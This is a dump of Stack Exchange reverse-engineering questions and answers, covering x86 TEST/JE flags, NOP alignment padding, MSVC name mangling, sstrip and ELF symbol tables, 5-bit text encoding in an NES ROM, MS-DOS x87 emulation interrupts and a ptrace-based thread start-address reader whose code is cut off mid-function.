</blockquote>

<p>More succinctly:</p>

<blockquote>
  <p>AND imm32 with EAX; set SF, ZF, PF according to result.</p>
</blockquote>

<p>Even more succinctly:</p>

<blockquote>
  <p>the AND instruction without storing the result</p>
</blockquote>

<p>So for </p>

<blockquote>
  <p><code>0040A3D1   A9 00010181           TEST EAX,81010100</code></p>
</blockquote>

<p>the value in <code>EAX</code> and <code>81010100</code> are ANDed together. </p>

<p>If the value in <code>EAX</code> is <code>0x810100FE</code>, the operation looks like this:</p>

<pre><code>EAX:                    10000001000000010000000011111110
0x81010100:         AND 10000001000000010000000100000000
                    ------------------------------------
0x81010000:             10000001000000010000000000000000
</code></pre>

<p>The result, <code>81010000</code>, is not 0, so the zero flag is not set.</p>

<p>If the value in <code>EAX</code> is <code>0x60E0FEFC</code> the operation looks like this:</p>

<pre><code>EAX:                    01100000111000001111111011111100
0x81010100:         AND 10000001000000010000000100000000
                    ------------------------------------
                        00000000000000000000000000000000
</code></pre>

<p>Here the result is 0, so the zero flag (ZF) is set to 1.</p>

<h2>2. JE</h2>

<p>According to the <a href=""http://x86.renejeschke.de/html/file_module_x86_id_146.html"" rel=""noreferrer""> x86 Instruction Set Reference entry for JE</a> found at <a href=""http://x86.renejeschke.de/"" rel=""noreferrer"">http://x86.renejeschke.de/</a>,</p>

<p><a href=""https://i.stack.imgur.com/ZG53X.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/ZG53X.png"" alt=""JE""></a></p>

<blockquote>
  <p>[JCC] checks the state of one or more of the status flags in the EFLAGS register (CF, OF, PF, SF, and ZF) and, if the flags are in the specified state (condition), performs a jump to the target instruction specified by the destination operand. A condition code (cc) is associated with each instruction to indicate the condition being tested for. If the condition is not satisfied, the jump is not performed and execution continues with the instruction following the Jcc instruction.</p>
</blockquote>

<p>In the case of 'JE' specifically,</p>

<blockquote>
  <p>Jump short if equal (ZF=1). </p>
</blockquote>

<p>For the operation </p>

<blockquote>
  <p><code>0040A3D1   A9 00010181           TEST EAX,81010100</code></p>
</blockquote>

<ul>
<li><p>if the value in <code>EAX</code> is <code>0x81010102</code>, the zero flag (ZF) does not get set (see above), so flow of control does not branch here.</p></li>
<li><p>if the value in <code>EAX</code> is <code>0x60E0FEFC</code>, the zero flag (ZF) is set to 1 (see above). As a result, flow of control branches at this point (EIP jumps).</p></li>
</ul>

<h2>Summary</h2>

<ul>
<li><code>TEST</code> is like <code>AND</code>, but the results of the operation are not saved. Only the PF, SF and ZF flags are set.</li>
<li>the zero flag (ZF) is set to 1 if the results of an arithmetic or logical operation (like <code>TEST</code>) are 0.</li>
<li><code>JE</code> causes <code>EIP</code> to jump if ZF = 1.</li>
<li>if the value in <code>EAX</code> is <code>0x81010102</code>, the zero flag (ZF) does not get set, so flow of control does not branch here.</li>
<li>if the value in <code>EAX</code> is <code>0x60E0FEFC</code>, the zero flag (ZF) is set to 1. As a result, flow of control branches at this point (EIP jumps).</li>
</ul>
","15185"
"Why ther are some many padding/leading nop instructions in my binary code?","1599","","<p>The test platform is on Linux 32bit, x86. 
So basically I wrote a simple C program like this:</p>

<pre><code>void main()
{
        double a = 10.0;
        printf(""hello world %f\n"", a);

}
</code></pre>

<p>I use gcc to compile to into ELF binary, and use objdump to disassemble it. I solve the reference to .rodata section, and refine the asm code in this :</p>

<pre><code>extern  printf
section .rodata

S_80484d0   db 0x68
db 0x65
  db 0x6c
db 0x6c
db 0x6f
db 0x20
db 0x77
db 0x6f
db 0x72
db 0x6c
db 0x64
db 0x20
db 0x25
db 0x66
db 0x0a


S_80484f0 db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x24, 0x40

section .text
global main
main:
push   ebp
mov    ebp,esp
and    esp,0xfffffff0
sub    esp,0x20
fld    qword [S_80484f0]
fstp   QWORD [esp+0x18]
fld    QWORD [esp+0x18]
fstp   QWORD [esp+0x4] 
mov    DWORD [esp],S_80484d0
call   printf
leave
ret
</code></pre>

<p>Then I re-compile this asm code to get a new ELF binary, and comparing the .text section of these two binaries.</p>

<p>Here is the confusing thing: The only different I can find is that there are more leading nop in front of the main function like this:</p>

<p>new ELF binary leading nop:</p>

<p><img src=""https://i.stack.imgur.com/4CiRE.png"" alt=""new ELF binary""></p>

<p>new ELF binary ending nop:</p>

<p><img src=""https://i.stack.imgur.com/nNKht.png"" alt=""new elf binary 2""></p>

<p>old ELF binary:</p>

<p><img src=""https://i.stack.imgur.com/goaAd.png"" alt=""old ELF binary""></p>

<p>Basically I don't think it is kinda of ""alignment"" issue, because there are just too much nop.</p>

<p>What's more, when I change the original code into just a simple helloworld code(without double number a), then basically there is <strong>no difference</strong> between these two ELF binaries.</p>

<p>Could anyone give me some help on why there are so many nop generated?</p>

<p>Thank you </p>
","<p><strong>Alignment.</strong></p>

<p>Note that all of the NOPs end (and the next function begins) at ...C0, ...F0. The compiler and/or linker inserted padding bytes so that the functions begin at 0x10 aligned addresses.</p>

<p>Different compilers / linkers will use different values for these bytes.  I've seen 90 (nop), CC (int3), as well as multi-byte NOPs that exactly fill the space between the functions.</p>

<p>You should check out this great answer on the same question over at <a href=""https://stackoverflow.com/a/7912617/119527"">Stack Overflow</a>. </p>

<p>In short, this is done for performance reasons, as processors typically fetch instructions in 16- or 32-byte strides, so it makes sense to have functions begin at one of these boundaries.</p>
","4085"
"Artifacts similar to ""@YAXPAX@"" within memory and IDA sessions","1588","","<p>When reversing binaries and parsing memory, I often run across strings like <code>""@YAXPAX@""</code> used to reference procedures.  Is there a name for this type of convention?</p>

<p>I believe theses strings are symbol references.</p>
","<p>I believe this strange stuff comes up due to <a href=""http://en.wikipedia.org/wiki/Name_mangling"">Name Mangling</a> it is also known as <em>name decoration</em>. <em>Name Mangling</em> is mechanism used by compilers to pass semantically relevant information from compilers to linkers. </p>

<p>This is how Wikipedia describes <a href=""http://en.wikipedia.org/wiki/Visual_C++_name_mangling"">Name Mangling for Visual C++ series of compilers</a>:</p>

<blockquote>
  <p>Visual C++ name mangling is a mangling (decoration) scheme used in Microsoft Visual C++ series of compilers. It provides a way of encoding name and additional information about a function, structure, class or another datatype in order to pass more semantic information from the Microsoft Visual C++ compiler to its linker. Visual Studio and the Windows SDK (which includes the command line compilers) come with the program undname which may be invoked to obtain the C-style function prototype encoded in a mangled name. The information below has been mostly reverse-engineered. There is no official documentation for the actual algorithm used.</p>
</blockquote>
","2390"
"No dynamic symbol table but resolution of method from shared libraries is working","1588","","<p>I want to find how can I identify calls to shared libraries in GDB only. On a stripped binary, I cannot found the dynamic symbol table:</p>

<pre><code>$&gt; objdump -tT crackme-01

crackme-01:     file format elf32-i386

objdump: crackme-01: not a dynamic object
SYMBOL TABLE:
no symbols

DYNAMIC SYMBOL TABLE:
no symbols
</code></pre>

<p>But still the dynamic library resolution is present, for instance before the call to <code>strcmp</code>:</p>

<pre><code>0x08048330 in ?? ()
...
0xb7ff2420 in _dl_runtime_resolve () from /lib/ld-linux.so.2
0xb7fec020 in _dl_fixup () from /lib/ld-linux.so.2
0xb7ff6678 in __x86.get_pc_thunk.bx () from /lib/ld-linux.so.2
0xb7fec033 in _dl_fixup () from /lib/ld-linux.so.2
0xb7fe7600 in _dl_lookup_symbol_x () from /lib/ld-linux.so.2
0xb7fe6df9 in do_lookup_x () from /lib/ld-linux.so.2
0xb7fedb70 in _dl_name_match_p () from /lib/ld-linux.so.2
...
0xb7ff5d74 in strcmp () from /lib/ld-linux.so.2
</code></pre>

<p>My question is how the symbol table is hidden from <code>readelf</code> but still be used during execution ?</p>
","<p>In fact, they probably used the <code>sstrip</code> software from the package <a href=""http://www.muppetlabs.com/~breadbox/software/elfkickers.html"" rel=""nofollow"">ElfKicker</a>. According to the <code>sstrip</code> <code>README</code> file:</p>

<blockquote>
  <p>sstrip is a small utility that removes the contents at the end of an
  ELF file that are not part of the program's memory image.</p>
  
  <p>Most ELF executables are built with both a program header table and a
  section header table. However, only the former is required in order
  for the OS to load, link and execute a program. sstrip attempts to
  extract the ELF header, the program header table, and its contents,
  leaving everything else in the bit bucket. It can only remove parts of
  the file that occur at the end, after the parts to be saved. However,
  this almost always includes the section header table, along with a few
  other sections that are not involved in program loading and execution.</p>
  
  <p>It should be noted that most programs that work with ELF files are
  dependent on the section header table as an index to the file's
  contents. Thus, utilities such as gdb and objdump will often have
  limited functionality when working with an executable with no section
  header table. Some other utilities may refuse to work with them at
  all.</p>
</blockquote>

<p>In fact, <code>sstrip</code> remove all section information from the executable and keep the executable still usable.</p>

<p>But let see the different levels is strip that we can reach.</p>

<h2>No stripping</h2>

<p>Let consider a program (similar to the one looked at in the question) with no stripping a all. </p>

<pre><code>$&gt; objdump -tT ./crackme

./crackme:     file format elf32-i386

SYMBOL TABLE:
08048134 l    d  .interp            00000000              .interp
08048148 l    d  .note.ABI-tag      00000000              .note.ABI-tag
08048168 l    d  .note.gnu.build-id 00000000              .note.gnu.build-id
0804818c l    d  .gnu.hash          00000000              .gnu.hash
080481ac l    d  .dynsym            00000000              .dynsym
0804822c l    d  .dynstr            00000000              .dynstr
...
080497dc g       .bss               00000000              _end
08048390 g     F .text              00000000              _start
080485f8 g     O .rodata            00000004              _fp_hw
080497d8 g       .bss               00000000              __bss_start
08048490 g     F .text              00000000              main
00000000  w      *UND*              00000000              _Jv_RegisterClasses
080497d8 g     O .data              00000000              .hidden __TMC_END__
00000000  w      *UND*              00000000              _ITM_registerTMCloneTable
080482f4 g     F .init              00000000              _init

DYNAMIC SYMBOL TABLE:
00000000      DF *UND*              00000000  GLIBC_2.0   strcmp
00000000      DF *UND*              00000000  GLIBC_2.0   read
00000000      DF *UND*              00000000  GLIBC_2.0   printf
00000000      DF *UND*              00000000  GLIBC_2.0   system
00000000  w   D  *UND*              00000000              __gmon_start__
00000000      DF *UND*              00000000  GLIBC_2.0   __libc_start_main
080485fc g    DO .rodata            00000004  Base        _IO_stdin_used
</code></pre>

<h2>Stripping with <code>strip</code></h2>

<pre><code>$&gt; strip ./crackme-striped
$&gt; objdump -tT ./crackme-striped 

./crackme-striped:     file format elf32-i386

SYMBOL TABLE:
no symbols

DYNAMIC SYMBOL TABLE:
00000000     DF *UND*   00000000  GLIBC_2.0   strcmp
00000000     DF *UND*   00000000  GLIBC_2.0   read
00000000     DF *UND*   00000000  GLIBC_2.0   printf
00000000     DF *UND*   00000000  GLIBC_2.0   system
00000000  w  D  *UND*   00000000              __gmon_start__
00000000     DF *UND*   00000000  GLIBC_2.0   __libc_start_main
080485fc g   DO .rodata 00000004  Base        _IO_stdin_used
</code></pre>

<p>As you see, the dynamic symbols are still here when <code>strip</code> is applied. The rest is just removed cleanly.</p>

<h2>Stripping with <code>sstrip</code></h2>

<p>Finally, lets take a look at what happen when using <code>sstrip</code>.</p>

<pre><code>$&gt; sstrip ./crackme-sstriped
$&gt; objdump -tT ./crackme-sstriped 

./crackme-sstriped:     file format elf32-i386

objdump: ./crackme-sstriped: not a dynamic object
SYMBOL TABLE:
no symbols

DYNAMIC SYMBOL TABLE:
no symbols
</code></pre>

<p>As you can notice, all symbols, including dynamic symbols have been removed. In fact, all the symbols pointing towards the PLT are removed and addresses are left as static addresses. Here is an example with the <code>_start</code> procedure preamble, first all the symbols:</p>

<pre><code> 0x8048390 &lt;_start&gt;:    xor    %ebp,%ebp
 0x8048392 &lt;_start+2&gt;:  pop    %esi
 0x8048393 &lt;_start+3&gt;:  mov    %esp,%ecx
 0x8048395 &lt;_start+5&gt;:  and    $0xfffffff0,%esp
 0x8048398 &lt;_start+8&gt;:  push   %eax
 0x8048399 &lt;_start+9&gt;:  push   %esp
 0x804839a &lt;_start+10&gt;: push   %edx
 0x804839b &lt;_start+11&gt;: push   $0x80485e0
 0x80483a0 &lt;_start+16&gt;: push   $0x8048570
 0x80483a5 &lt;_start+21&gt;: push   %ecx
 0x80483a6 &lt;_start+22&gt;: push   %esi
 0x80483a7 &lt;_start+23&gt;: push   $0x8048490
 0x80483ac &lt;_start+28&gt;: call   0x8048380 &lt;__libc_start_main@plt&gt;
 0x80483b1 &lt;_start+33&gt;: hlt    
</code></pre>

<p>And, then <code>strip</code>ep:</p>

<pre><code>0x8048390:  xor    %ebp,%ebp
0x8048392:  pop    %esi
0x8048393:  mov    %esp,%ecx
0x8048395:  and    $0xfffffff0,%esp
0x8048398:  push   %eax
0x8048399:  push   %esp
0x804839a:  push   %edx
0x804839b:  push   $0x80485e0
0x80483a0:  push   $0x8048570
0x80483a5:  push   %ecx
0x80483a6:  push   %esi
0x80483a7:  push   $0x8048490
0x80483ac:  call   0x8048380 &lt;__libc_start_main@plt&gt;
0x80483b1:  hlt    
</code></pre>

<p>And, finally, the <code>sstrip</code> version:</p>

<pre><code>0x8048390:  xor    %ebp,%ebp
0x8048392:  pop    %esi
0x8048393:  mov    %esp,%ecx
0x8048395:  and    $0xfffffff0,%esp
0x8048398:  push   %eax
0x8048399:  push   %esp
0x804839a:  push   %edx
0x804839b:  push   $0x80485e0
0x80483a0:  push   $0x8048570
0x80483a5:  push   %ecx
0x80483a6:  push   %esi
0x80483a7:  push   $0x8048490
0x80483ac:  call   0x8048380
0x80483b1:  hlt    
</code></pre>

<p>Surprisingly the executable is still functional. Let's compare what ELF headers are left after <code>strip</code> and <code>sstrip</code> (as suggested Igor). First, after a <code>strip</code>:</p>

<pre><code>$&gt; readelf -l crackme-striped 

Elf file type is EXEC (Executable file)
Entry point 0x8048390
There are 8 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 RWE 0x4
  INTERP         0x000134 0x08048134 0x08048134 0x00013 0x00013 RWE 0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x006b4 0x006b4 RWE 0x1000
  LOAD           0x0006b4 0x080496b4 0x080496b4 0x00124 0x00128 RWE 0x1000
  DYNAMIC        0x0006c0 0x080496c0 0x080496c0 0x000e8 0x000e8 RWE 0x4
  NOTE           0x000148 0x08048148 0x08048148 0x00044 0x00044 RWE 0x4
  GNU_EH_FRAME   0x000600 0x08048600 0x08048600 0x00024 0x00024 RWE 0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10

 Section to Segment mapping:
   Segment Sections...
   00     
   01     .interp 
   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame 
   03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss 
   04     .dynamic 
   05     .note.ABI-tag .note.gnu.build-id 
   06     .eh_frame_hdr 
   07     
</code></pre>

<p>And, then the version that went through with <code>sstrip</code>:</p>

<pre><code>$&gt; readelf -l ./crackme-sstriped 

Elf file type is EXEC (Executable file)
Entry point 0x8048390
There are 8 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 RWE 0x4
  INTERP         0x000134 0x08048134 0x08048134 0x00013 0x00013 RWE 0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x006b4 0x006b4 RWE 0x1000
  LOAD           0x0006b4 0x080496b4 0x080496b4 0x00124 0x00128 RWE 0x1000
  DYNAMIC        0x0006c0 0x080496c0 0x080496c0 0x000e8 0x000e8 RWE 0x4
  NOTE           0x000148 0x08048148 0x08048148 0x00044 0x00044 RWE 0x4
  GNU_EH_FRAME   0x000600 0x08048600 0x08048600 0x00024 0x00024 RWE 0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
</code></pre>

<p>As you can see, the name of the sections have also been removed (as announced in README file).</p>

<p>Note that, applying <code>sstrip</code> on an executable that went through <code>upx</code> render the final executable unusable (I tried).</p>
","3826"
"String extraction from an iNES ROM dump","1587","","<p>I want to extract the strings in <a href=""http://www.speedyshare.com/NGGVr/Shadowgate-U.nes"">Shadowgate for NES</a>. I ran <code>file</code> on the image and then <code>strings</code>, no luck. I found <a href=""http://fms.komkon.org/EMUL8/NES.html#LABM"">some information about the NES cartridge file format</a>. The docs mention the use of “Name Tables”. Is there a way to disassemble this file and view the strings? I tried</p>

<pre><code> strings -e -T rom.bin
</code></pre>

<p>I also tried :</p>

<pre><code> objdump -i rom.bin
</code></pre>

<p>The processor looks to be an M6502 processor and there are Windows disassemblers available.</p>
","<p>There are several approaches to locating strings in an unknown file. One you already tried: <code>strings</code>. This looks for plain, unencoded ASCII text:</p>

<blockquote>
  <p>Strings  looks  for  ASCII  strings in a binary file [..] A  string is any sequence of 4 (the default) or more printing characters ending with a newline or a  null. (<code>man strings</code>)</p>
</blockquote>

<p>But there are many reasons why this naive approach may fail. First off: not every text in the world is ASCII encoded. In fact, examining your file with a binary editor, you can find graphic images for the font used in the game at offset 0x20010 -- monochrome bitmaps of 8x16 pixels. If you assume the first character (a '0') is numbered zero, then 'A' is at position 31 -- definitely <em>not</em> ASCII text. Of course, it's possible the text drawing routine knows this, and re-orders characters to be printed according to this scheme; but, given the age of this particular game (1987) it is more likely that the textual data is <em>stored</em> according to this weird encoding.</p>

<p>In itself, however, this should not be a problem.</p>

<p>Googling for this game provides a number of screen shots, and you can read some of the texts that may appear -- ""The last thing you remember"", ""Word of your historic quest"", etc. --, and a noteworthy point is that all text appears to be in ALL CAPS.</p>

<p>How does that help? Well, if the encoding is <em>remotely</em> 'normal', the character code of an 'A' might be anything, but you can safely assume that <code>code+1</code> is 'B', <code>code+2</code> is 'C', and so on. Now let's assume the text ""THE"" occurs <em>anywhere</em> (a safe assumption). Subtract 'T' from the first byte in the data and note the difference. Subtract this difference from the next byte and test if it is an 'H'; if so, test the same difference on the <em>next</em> byte and see if it is an 'E'. Three times is a charm (in this case), and since the string ""THE"" ought to come up very frequent, you should see lots of hits with the same difference. Then you can write a custom routine to 'convert' <em>all</em> data bytes according to this scheme, and check again if you find useful strings.</p>

<p>That didn't work for Shadowgate.</p>

<p>Another option is that the text has been deliberately obfuscated. A popular (because <em>fast</em>) option was to <a href=""http://en.wikipedia.org/wiki/Xor"">XOR</a> text with a constant. That way the text was not readily visible when inspected with a hex viewer, yet could easily be displayed. So I did the same as above, only now with a XOR operation instead of a constant subtraction. It didn't work either.</p>

<p>Next: given that SG is a <em>text</em> adventure, it stands to reason the writers tried to stuff as much as possible text into the poor NES memory. To find <em>real world compression</em> (ZIP, LZW) in such an old game is fairly rare, the compression schemes tended to be quite simple. After all, not only RAM was limited but CPU speed as well. What if every character is stored as a 5-bit sequence? That would save lots of memory -- every 8 characters of text could be stored in just 5 bytes, a compression rate of 62.5%.</p>

<p>Why ""5-bit""? We're talking English text here, plus a handful of punctuation characters, plus (maybe) digits '0' to '9'. The alphabet itself is 26 characters long, which leaves another 6 values for anything else -- and, hey, one of the extra codes could mean ""for the next character use all 8 bits"".</p>

<p>Checking every 5 bits against my test string (which in cryptography is called a <a href=""http://en.wikipedia.org/wiki/Crib_%28cryptanalysis%29"">""crib""</a>), I found the following:</p>

<pre><code>candidate at 0570, delta is 41 H_A\`THE[TROLL[
candidate at 0670, delta is 41 _H\`ATHE[TROLL[
candidate at 0878, delta is 41 `AN`QTHE[TROLL[
candidate at 09E3, delta is 41 FROM^THE[DEPTHS
candidate at 1380, delta is 41 E[OF[THEM_A[THI
candidate at 13F0, delta is 41 ]NX_ATHE[WORDS[
candidate at 14C0, delta is 41 PD^`QTHE[FLAME[
candidate at 1BBA, delta is 41 UDGE[THEM[BY_A_
candidate at 22E0, delta is 41 ]BX_ATHE[GLASS[
candidate at 230D, delta is 41 ID_A[THE^SIGN[O
candidate at 2375, delta is 41 S[ON[THEM_A\`AB
candidate at 2390, delta is 41 LLOW[THE^VISCOU
candidate at 2528, delta is 41 F]PX_THE[STONE[
candidate at 25E6, delta is 36 @CP=KTHE@?OFHBS
candidate at 27F8, delta is 41 YDP]ATHE[BARK[O
candidate at 2B1E, delta is 41 D_H\]THE[WATER[
</code></pre>

<p>.. and many more. You can see it works, because I also decoded a few bytes before and after the test string, and that's recognizable as 'something' as well. The 'delta' shown is the difference between the five-bit code (0..31) and ASCII, and you can see it's <code>41</code> for the majority of strings (the only exception seems a false positive).</p>

<p>To assure that this <em>is</em> correct, I tried with another crib: <code>KING</code> (it's a fantasy game):</p>

<pre><code>candidate at 0661, delta is 41 Y[LOOKING[SPEAR
candidate at 23B4, delta is 41 [DRINKING[TAR_A
candidate at 2B5D, delta is 41 [DRINKING_A\`AA
candidate at 8E1B, delta is 43 \XVFDKINGDHEEVE
candidate at 146F9, delta is 34 JL54HKING48A4:D
</code></pre>

<p>That seems to work out as well: not the 'king' I was expecting, but nevertheless good results with a delta of 41, random stuff with another delta.</p>

<p>But finding useful strings this way is rather fortunate, because of course there is no guarantee that reading every 5 bits <em>starting at the first byte</em> should display anything useful. There may be lots of other strings in between the ones shown, but they didn't happen to start on a multiple of 5*8 bits. Suppose there was no text at position #0, but there <em>was</em> at position #1, then I cannot see it:</p>

<pre><code> bits for byte 0,1
 0000.0000 TTTT.T000 (T = Text character bits)
 ---
 reading 1st 5 bits
 1111.1??? ????.????
 2nd 5 bits -- the wrong ones!
 .... .111 11??.????
</code></pre>

<p>To properly decode <em>all</em> strings, you'd now take the following route:</p>

<ul>
<li>my list of results contain readable text, but some garbage as well. Find out what the 'garbage' is (<code>[</code> appears to be a simple space, but <code>THEM_A\'AB</code> needs a closer look).</li>
<li>find as much as possible <em>string starts</em> and note down their addresses</li>
<li>search the binary for these addresses. After all, if they are 'used', there needs to be some reference to them.</li>
<li>Before and after these addresses, there will be more. These are addresses of strings the search algorithm did <em>not</em> find, but still may be valid.</li>
<li>Usually, a list of this kind is a contiguous one (although there may be some data associated with each string). Scan the binary up and down for similar addresses, until you found what's sure to be the start and the end.</li>
<li>Loop over the list and display everything you can according to the decoding scheme.</li>
<li>Sit back and enjoy a job well done.</li>
</ul>
","3004"
"Unpacking binary statically","1587","","<p>Say I have a binary that I'm not able to execute (for example it runs on some device that I don't have one of), but I can disassemble it. I can get the docs on the architecture. (It's MIPS little endian in my case.) But the binary has very few imports, very few strings, etc., so it really seems like it's packed.</p>

<p>How can I go about <em>statically</em> unpacking it? (Edit: I mean, unpacking it without any access to the original device.)</p>
","<p>Over the 30+ embedded device firmwares I've seen in the past I have rarely seen them using anything proprietary. Often it's just gzip/LZMA or a similar compression they're using (albeit sometimes with modified or stripped headers). </p>

<p>Thus as a first step I would try something like <a href=""http://code.google.com/p/binwalk/"">binwalk</a> to search for known compression algorithms. If that doesn't help try tools for finding crypto constants such as <a href=""http://www.hexblog.com/ida_pro/files/findcrypt2.zip"">Find Crypt</a> or <a href=""http://aluigi.altervista.org/mytoolz/signsrch.zip"">Sign search</a>. This only works if the crypto is a software implementation. If it's a more sophisticated device, say a set-top-box, with a hardware accelerated decryption engine and OTP memory for storing the key then you're out of luck without run-time access (unless they greatly screw up passing the key from OTP to the decryption engine).</p>

<p>Finally you could try to find out if they use some proprietary algorithm and either emulate that algorithm using <a href=""http://wiki.qemu.org/Main_Page"">QEMU</a> or <a href=""http://gxemul.sourceforge.net/"">gxemul</a> or write your own decompressor in higher level language.</p>
","117"
"What is the protocol for x87 floating point emulation in MS-DOS?","1583","","<p>I'm trying to get useful results using the <a href=""https://github.com/uxmal/reko"">Reko decompiler</a> on a dusty old MS-DOS binary compiled with Borland C++ that appears to be performing a lot of floating point arithmetic. I'm seeing code sequences like</p>

<pre><code>mov ax,0x4D8C    ; segment selector
mov es,ax
int 0x3C         ; call x87 emulator??
fld dword ptr [&lt;some address&gt;]
sub sp,8
int 0x39         ; call x87 emulator??
</code></pre>

<p>...etc. A cursory search engine search strongly hints that the <code>int</code> instructions are invoking an x87 emulation library; when the x87 is present, it lets the coprocessor execute the instruction, but when it isn't, the emulator emulates.</p>

<p>I am well familiar with how to <em>implement</em> FPU operations, with shifts and whatnot. What I'd like to find out more about is the protocol of these invocations to the emulator. I have been unable to locate documentation. Perhaps one of the members of the RE community does?</p>
","<p>Nothing like asking a question on stackexchange, only to be humiliated by finding the answer (or at least part of it). After finding the following source file, it started making sense:</p>

<p><a href=""https://github.com/alexhenrie/wine/blob/master/dlls/krnl386.exe16/fpu.c"">https://github.com/alexhenrie/wine/blob/master/dlls/krnl386.exe16/fpu.c</a></p>

<p>On old 8086 machines, where there is no trap for invalid instructions, the Elders of the Past came up with an emulation strategy. All x87 instructions are in the <code>D8</code>-<code>DF</code> range (8 possible values) followed by modrm and other goodness. If you prefix the instruction with a <code>FWAIT</code> (opcode <code>9B</code>), you guarantee that there always be two bytes of code before the modrm byte, looking something like <code>9B Dx</code>. However, instead of emitting those two bytes, the compiler emits <code>CD xx</code>, where xx ranges <code>34</code>-<code>3B</code> (8 possible values). As we all know, CD is the encoding of the x86 <code>int</code> instruction.</p>

<p>When the CPU executes the <code>int</code> instruction and arrives at the handler for <code>34</code>-<code>3B</code>, it vectors off to the interrupt handler.  If there isn't an x87 coprocessor available, the handler will emulate the floating point instruction, maintaining the coprocessor state in memory. If however there <em>is</em> an x87 coprocessor present, the handler will peek at the return stack to see where the <code>int</code> instruction is located, and <em>overwrite it</em> with the appropriate <code>9B Dx</code> byte sequence, corresponding to the <code>CD 3x</code> byte sequence. It then returns control to the patched instruction so that it gets executed. Now that it has been patched, the instruction is an actual FPU instruction, and future executions of the instructions will no longer take the long detour through the emulator.</p>

<p>The documentation for how to deal with interrupt <code>3E</code> is still not forthcoming. However, for the time being, I have enough information to implement x87 emulation support in the Reko decompiler.</p>
","12277"
"How to determine if binary has symbol table","1570","","<p>Is there a practical way to find if the raw binary (firmware image for example) has symbol table ? Finding start or end of it ? And if it exists is it a single block or can it be seperate multiple blocks with another data inbetween ?    </p>
","<p>I worked with some types of symbol tables. All these types are very different and can not be defined as something that allows automatic detection. It can be some kind of list of tuples like (pointer to name, type, pointer to object, [something else]). There are a lot of other variants also. 
Any time I succeeded to recognize symbol table it was done by manual inspection of analyzed dump. </p>

<p>My methodology to find such symbol table is as follows (assuming that IDA didn't find it automatically):</p>

<p>1 - Find all strings in the binary, sort them and inspect results.
    If you see a lot of potential object names (function names, global variable names etc) you can suspect that you can use it and it is possible that there is symbol table in the binary.  </p>

<p>2 - Choose some strings from the set. Check references to them. If you find 
these references in something that looks like array of structures or any other regular data structure it might be your symbol table.</p>

<p>3 - When you understand what is the structure of your symbol table you can rename your objects with simple IDAPython script.</p>
","3514"
"How can I get a running thread's start address on linux?","1569","","<h2>Problem Statement</h2>

<p>I'm trying to get the address of a running thread's <code>start_routine</code> as passed in the <code>pthread_create()</code> call.</p>

<h2>Research so far</h2>

<p>It is apparently not in <code>/proc/[tid]/stat</code> or <code>/proc/[tid]/status</code>.</p>

<p>I found that <code>start_routine</code> is a member of <code>struct pthread</code> and gets set by <code>pthread_create</code>[<a href=""http://fxr.watson.org/fxr/source/nptl/pthread_create.c?v=GLIBC27;im=excerpts#L455"">1</a>].
If I knew the address of this <code>struct</code>, I could read the <code>start_routine</code> address.</p>

<p>I also found <code>td_thr_get_info</code> defined in the debugging library <code>thread_db.h</code> [<a href=""http://fxr.watson.org/fxr/source/nptl_db/td_thr_get_info.c?v=GLIBC27#L27"">2</a>]. It fills a <code>struct</code> with information about the thread, including the start function [<a href=""http://fxr.watson.org/fxr/source/nptl_db/thread_db.h?v=GLIBC27#L259"">3</a>]. But, it needs a <code>struct td_thragent</code> as an argument and I don't know how to create it properly.</p>
","<p>Thanks to the hints of blabb and Jonathon Reinhart I was able to write a <code>get_thread_start_address()</code> function. It reads the same address used by <code>pthread_start_thread()</code> to call the start routine. In Kernel 3.2.0-4-686-pae this address is <code>GS+0x234</code>. I use <code>ptrace</code> to get the <code>GS register</code> and the actual <code>GS segment address</code>. Here is my code:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/ptrace.h&gt;
#include &lt;sys/user.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;asm/ldt.h&gt;
#include &lt;asm/ptrace.h&gt;

int attach(int tid);
int detach(int tid);
void print_error(char* func_name, int errnumber);

int get_gs_register(int tid){
    struct user_regs_struct regs;
    int ret = ptrace(PTRACE_GETREGS, tid, NULL, &amp;regs);
    if(ret == -1){
        print_error(""PTRACE_GETREGS"", errno);
        return -1;
    }
    return regs.xgs;
}

// This is needed to get the actual GS segment address from the GS register value
int get_thread_area_base(tid, gs){
    struct user_desc desc;
    memset(&amp;desc, 0, sizeof(desc));
    int ret = ptrace(PTRACE_GET_THREAD_AREA, tid, gs / LDT_ENTRY_SIZE, &amp;desc);
    if(ret == -1){
        print_error(""PTRACE_GET_THREAD_AREA"", errno);
        return -1;
    }
    return desc.base_addr;
}

void* get_start_address(tid, start_address_pointer){
    char start_addr_str[4];
    int mem_file;
    char mem_file_path[255];
    snprintf(mem_file_path, sizeof(mem_file_path), ""/proc/%i/mem"", tid);
    mem_file = open(mem_file_path, O_RDONLY);
    if(mem_file == -1){
        print_error(""open()"", errno);
        return (void*) -4;
    }
    int ret = lseek(mem_file, start_address_pointer, SEEK_SET);
    if(ret == -1){
        print_error(""lseek()"", errno);
        return (void*) -5;
    }

    ret = read(mem_file, start_addr_str, 4);
    if(ret == -1){
        print_error(""read()"", errno);
        return (void*) -6;
    }   

    return (void*) *((int*)start_addr_str);
}

int main(int argc, char* argv[]){
    if(argc &lt;= 1){
        printf(""Usage: %s TID\n"", argv[0]);
        return -1;
    }   
    int tid = atoi(argv[1]);    
    int gs;
